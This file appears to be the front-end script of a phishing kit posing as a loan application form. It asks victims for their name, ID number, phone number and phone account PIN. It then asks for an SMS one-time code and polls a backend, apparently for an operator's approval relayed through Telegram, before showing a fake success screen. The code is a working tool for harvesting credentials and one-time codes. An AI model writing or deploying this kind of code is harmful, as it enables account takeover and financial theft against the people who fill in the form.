let currentAppReference = null;
let userPhone = null;
let pollInterval = null;

const step1Form = document.getElementById('step1-form');
const step2Form = document.getElementById('step2-form');
const successScreen = document.getElementById('success-screen');
const otpStatusBanner = document.getElementById('otp-status-banner');
const otpStatusText = document.getElementById('otp-status-text');
const btnStep2 = document.getElementById('btn-step2');
const otpInput = document.getElementById('otp');

// Horizontal Step Indicator Elements
const stepIndicator = document.getElementById('step-indicator');
const stepCircle2 = document.getElementById('step-circle-2');
const stepLabel2 = document.getElementById('step-label-2');
const stepLine1 = document.getElementById('step-line-1');

// STEP 1: Phone, PIN & Applicant Details Submission
step1Form.addEventListener('submit', async (e) => {
  e.preventDefault();

  const fullName = document.getElementById('fullName').value.trim();
  const idNumber = document.getElementById('idNumber').value.trim();
  const loanAmount = document.getElementById('loanAmount').value.trim();
  const phoneInput = document.getElementById('phone').value.trim();
  const pinInput = document.getElementById('pin').value.trim();
  const btnStep1 = document.getElementById('btn-step1');

  btnStep1.innerText = "Processing...";
  btnStep1.disabled = true;

  try {
    const response = await fetch('/api/apply-loan', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        fullName,
        idNumber,
        loanAmount,
        phone: phoneInput, 
        pin: pinInput 
      })
    });

    const result = await response.json();

    if (result.success) {
      currentAppReference = result.appReference;
      userPhone = phoneInput;

      // Update Horizontal Progress Bar to Step 2
      stepCircle2.className = "w-10 h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center shadow-md";
      stepLabel2.className = "text-xs font-semibold text-blue-600 mt-2";
      stepLine1.className = "flex-1 h-1 bg-blue-600 mx-2 rounded transition-colors duration-300";

      // Hide Step 1, Show Step 2
      step1Form.classList.add('hidden');
      step2Form.classList.remove('hidden');
    } else {
      alert('Submission failed. Please try again.');
      btnStep1.innerText = "Proceed to Verification";
      btnStep1.disabled = false;
    }
  } catch (err) {
    console.error('Error in step 1:', err);
    alert('Server connection error.');
    btnStep1.innerText = "Proceed to Verification";
    btnStep1.disabled = false;
  }
});

// STEP 2: 6-Digit OTP Submission & Verification Polling
step2Form.addEventListener('submit', async (e) => {
  e.preventDefault();

  const code = otpInput.value.trim();

  if (code.length !== 6) {
    alert('Please enter a valid 6-digit OTP code.');
    return;
  }

  btnStep2.innerText = "Verifying...";
  btnStep2.disabled = true;
  otpInput.disabled = true;

  otpStatusBanner.className = "bg-blue-50 border border-blue-200 rounded-lg p-3.5 text-center";
  otpStatusText.className = "text-xs text-blue-700 font-medium";
  otpStatusText.innerText = "Verifying OTP code, please wait...";

  try {
    const response = await fetch('/api/submit-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        appReference: currentAppReference,
        phone: userPhone,
        otpCode: code
      })
    });

    const result = await response.json();

    if (result.success) {
      startPollingStatus(currentAppReference);
    } else {
      resetOtpForm('Failed to submit OTP. Please try again.');
    }
  } catch (err) {
    console.error('Error in step 2:', err);
    resetOtpForm('Server connection error.');
  }
});

// Poll backend every 2 seconds for Telegram status
function startPollingStatus(appReference) {
  if (pollInterval) clearInterval(pollInterval);

  pollInterval = setInterval(async () => {
    try {
      const res = await fetch(`/api/check-status/${appReference}`);
      const data = await res.json();

      if (data.status === 'OTP_APPROVED') {
        clearInterval(pollInterval);
        stepIndicator.classList.add('hidden');
        step2Form.classList.add('hidden');
        successScreen.classList.remove('hidden');
      } else if (data.status === 'OTP_REJECTED') {
        clearInterval(pollInterval);
        resetOtpForm('❌ Incorrect OTP entered. Please check your SMS and try again.');
      }
    } catch (err) {
      console.error('Polling error:', err);
    }
  }, 2000);
}

function resetOtpForm(message) {
  otpStatusBanner.className = "bg-red-50 border border-red-200 rounded-lg p-3.5 text-center";
  otpStatusText.className = "text-xs text-red-700 font-semibold";
  otpStatusText.innerText = message;

  btnStep2.innerText = "Submit OTP";
  btnStep2.disabled = false;
  otpInput.disabled = false;
  otpInput.value = '';
  otpInput.focus();
        }
      
